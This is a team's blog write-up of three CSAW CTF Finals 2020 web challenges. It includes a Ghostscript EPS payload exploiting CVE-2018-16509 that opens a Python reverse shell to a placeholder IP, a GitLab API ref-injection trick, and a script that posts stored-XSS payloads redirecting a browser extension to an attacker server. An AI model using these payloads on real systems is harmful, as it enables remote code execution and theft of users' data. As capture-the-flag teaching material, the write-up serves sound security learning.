---
published: true
title: "CSAW CTF Finals 2020 Writeups"
date: 2020-11-09T00:00:00.000Z
categories: ["article"]
tags: ["csaw", "ctf"]
---

* Al Capwn participated in the online CSAW CTF Finals 2020 from the India region. We stood 6th in the region scoring 2101 points. We did miss going to IIT Kanpur for the offline event, but, nonetheless we had tons of fun!

# Web - Picgram - 100

> Check out this new photo upload service! Hopefully you won't be able to do anything spooky with it. 
> 
> http://web.chal.csaw.io:5000

The challenge downloads contained the server's Dockerfile and Flask server script.

The server accepted an image in a POST request and echoed a resized version of the same image.

The Dockerfile builds upon the base image `vulhub/ghostscript:9.23-python` which is an intentionally vulnerable container image having an older version of the Pillow library ([CVE-2018-16509](https://nvd.nist.gov/vuln/detail/CVE-2018-16509)).

Quick google leads us to the vulhub GitHub repository containing information about the CVE and a convenient exploit payload i.e a JPG image with Ghostcript containing RCE. I modified the RCE to open up a reverse shell to my server and found the flag inside the sqlite database for the app server.

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",5300));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') currentdevice putdeviceprops
```

# Web - Shark Facts - 250 

> Sharks are all the rage right now, so people are craving shark facts. Unfortunately the shark fact maintainer went AWOL and is not accepting pull requests anymore :(
> 
> http://sharks.alternativefacts.systems/

We are given the challenge URL and the Flask server code. The application can be logged into using GitLab OAuth and creates a private repository containing shark facts for us under their own account with the name `shark-facts-for-<username>`.

After logging in, the server accepts the GitLab URL of a file to be read from the repository using the GitLab API.
{{< figure caption="Shark Facts Homepage" src="/img/shark-facts-home.png" alt="Shark Facts Homepage" position="center" style="border" >}}

The server code shows that if the file read contains the string `blahaj is life`, the flag is returned along with the file. Thus, Our goal is to fetch a file from GitLab with the contents `blahaj is life`. 

In this challenge we can control the input URL for the file to be read and our GitLab username. The input url by default contains the path of the README.md in the repository containing the Sharky facts. 
{{< figure caption="Server Code" src="/img/shark-facts-server.png" alt="Shark Facts Server" position="center" style="border" >}}

The server code accepted the URL and verified it to be a part of the repository created by the server, thus you cannot pass your own public repositories and the file has to be present in the SharkFacts repository. The URL is checked to be of the form `https://gitlab.com/sharkfacts/shark-facts-for-<username>/-/blob/main/<filename>` and everything beyond /blob/main is passed into the request URL.

Request URL is generated as: `https://gitlab.com/api/v4/projects/<project_name>/repository/files/<filename>/raw?ref=main`

The GitLab Files API accepts the repository ref from which to fetch the file from. We can form the input URL in such a way to control the ref to be used.
```
filename: README.md/raw?ref=<commit-id>&
final generated URL: https://gitlab.com/api/v4/projects/shark-facts-for-<username>/repository/files/README.md/raw?ref=<commit-id>&/raw?ref=main
```
This final URL allows us to fetch from any ref in the Git repository tree. We do not have write permissions in the GitLab repository but we can create a fork and open a merge request. This creates a branch with our file containing `blahaj is life` whose commit id we can copy. Submitting the filename with the commit id gives us the flag.

{{< figure caption="Shark Facts Flag" src="/img/shark-facts-flag.png" alt="Shark Facts Flag" position="center" style="border" >}}
```
https://gitlab.com/sharkfacts/shark-facts-for-arush15june/-/blob/main/README.md/raw?ref=03f8358719a72efc7c8ed702bc3ddfacfd843231&
```

Flag: `flag{Shark Fact #81: 97 Percent of all sharks are completely harmless to humans}`

# Web - Comment Anywhere - 300

>This is a cool new Chrome extension i'm working on which lets you leave a comment anywhere on any page that others using the extension can see. Check it out!

We are given the chrome extension `extension.crx` and the flask server code `app.py`. We installed the extension in a Chromium installation running inside an Ubuntu virtual machine and unpacked the CRX extension to get the extension source code.

The extensions allowed you to comment on a webpage and the comments will be visible to other users of the extension on the same URL and page coordinates. The extension was supposed to open up an input prompt to pass the comment but that never worked for us. 

The server code listed two API routes `/comment` for making new comments and `/comments?url=<url>` for listing comments for a specific URL. As the API was open, we could list and create new comments for any URL. On requesting the comments for the `https://ctf.csaw.io` using `GET /comments?url=https://ctf.csaw.io` we got a few comments with the creator as admin and many XSS payloads from other participants hinting us on how we should proceed. A lot of the payloads were using window.PostMessage to change the configuration of the extension configuring it to change its API server to one controlled by the participants. As the `POST /comment` API didnt perform any HTML escaping we could pass script tags directly via a POST requests. 

The challenge hint told us to try and see what the admin was doing. We hosted our own API server using the the given server file and comment an XSS payload changing the extension API server via `window.PostMessage` giving us the requests made by the admin. 

```python
from concurrent.futures import ThreadPoolExecutor
import requests
import json

URL = "http://comment-anywhere.chal.csaw.io:8000"
url = "http://ctf.csaw.io/"
def do_comment(comm):
  return requests.post(URL+'/comment', json={
    'url':url,
    'coords': {'x':42,'y':123},
    'creator': "shell",
    'comment': comm,
  })


def do():
  r = do_comment("""<img src=x onerror=\";window.postMessage({type: 'commentAnywhereSetCoords', coords: {type: 'setConfig', key: 'api', value: 'http://<SERVER_IP>:8001'}});\">""")
  print(r, r.text)
  rL = requests.get(URL+'/comments?url=https://ctf.csaw.io/')
  try:
    print(rL.text)
    if '<SERVER_IP>' in rL.text:
      print('GOT', len(rL.json()))
  except:
    pass

if __name__ == "__main__":
  while True:
    futures = []
    with ThreadPoolExecutor(max_workers=8) as executor:
      futures.append(executor.submit(do))
```
Once the payload was executed by the admin browser, we started receiving requests from the admin listing comments from many URLs, the flag was part of the URLs being listed by the admin.

```
GET /comments?url=https%3A%2F%2Fctf.csaw.io%2Fcomment-anywhere%2Fflag%257Bh0w_many_l%40yers_of_yavaScr1pt_r_u_0n%3F%7D
```

Flag: `flag{h0w_many_l@yers_of_yavaScr1pt_r_u_0n?}` 